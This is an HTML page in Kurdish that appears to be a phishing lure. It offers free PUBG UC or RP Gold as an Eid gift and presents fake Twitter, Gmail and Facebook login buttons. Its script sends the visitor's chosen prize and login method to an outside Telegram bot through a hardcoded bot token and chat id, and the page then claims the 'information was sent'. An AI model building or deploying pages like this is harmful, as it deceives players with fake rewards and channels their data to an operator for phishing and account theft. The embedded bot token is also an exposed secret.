<!DOCTYPE html><html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>دیاری جەژن - PUBG Event</title>
    <style>
        body {
            margin: 0;
            font-family: sans-serif;
            background: url('https://i.ibb.co/RTmz4QmC/2gxxm37lrgy51.jpg') no-repeat center center fixed;
            background-size: cover;
            color: white;
            text-align: center;
        }
        .container {
            background: rgba(0, 0, 0, 0.6);
            margin: 50px auto;
            padding: 20px;
            max-width: 400px;
            border-radius: 15px;
        }
        h1 {
            font-size: 2rem;
            margin-bottom: 20px;
        }
        .option, .login-buttons button {
            background: #ffcc00;
            padding: 15px;
            margin: 10px 0;
            border: none;
            border-radius: 10px;
            font-size: 1.1rem;
            cursor: pointer;
            width: 100%;
        }
        .login-buttons button {
            background: #007bff;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .login-buttons button:hover {
            background: #0056b3;
        }
        .login-buttons img {
            width: 20px;
            height: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>دیاری جەژن</h1><button class="option" onclick="selectOption('RP گۆڵد بەدەست بینە بە خۆڕایی')">ئەتەویؕ RP گۆڵد بەدەست بینە بە خۆڕایی</button>

    <button class="option" onclick="selectOption('1200 UC بە خۆڕایی')">1200 UC بە خۆڕایی</button>

    <p style="margin-top: 20px; font-weight: bold;">چونە ژوەرەوە هەڵبژێرەت:</p>
    <div class="login-buttons">
        <button onclick="loginWith('Twitter')">
            <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter">
            Twitter
        </button>
        <button onclick="loginWith('Gmail')">
            <img src="https://cdn-icons-png.flaticon.com/512/281/281769.png" alt="Gmail">
            Gmail
        </button>
        <button onclick="loginWith('Facebook')">
            <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook">
            Facebook
        </button>
    </div>
</div>

<script>
    let selectedOption = "";

    function selectOption(option) {
        selectedOption = option;
        alert("هەڵبژاردنی تۆ: " + option);
    }

    function loginWith(method) {
        if (!selectedOption) {
            alert("تکایە یەکێک لە هەلبژاردنەکان هەلبژێرە");
            return;
        }

        const message = `✉️ باشداربونی جەژن\n--------------------------\n✨ هەلبژاردن: ${selectedOption}\n🔐 چۆنەژوورەوە: ${method}`;

        fetch("https://api.telegram.org/bot7642269779:AAFts092aU5cIV0CNQqexMk1uU4jdFpo7fY/sendMessage", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: "7594104612",
                text: message
            })
        }).then(res => {
            if (res.ok) {
                alert("زانیاریەکان نێردران، سوپاس!");
            } else {
                alert("هەڵەیەک ڕوویدا لە ناردنی زانیاریەکان");
            }
        });
    }
</script>

</body>
</html>
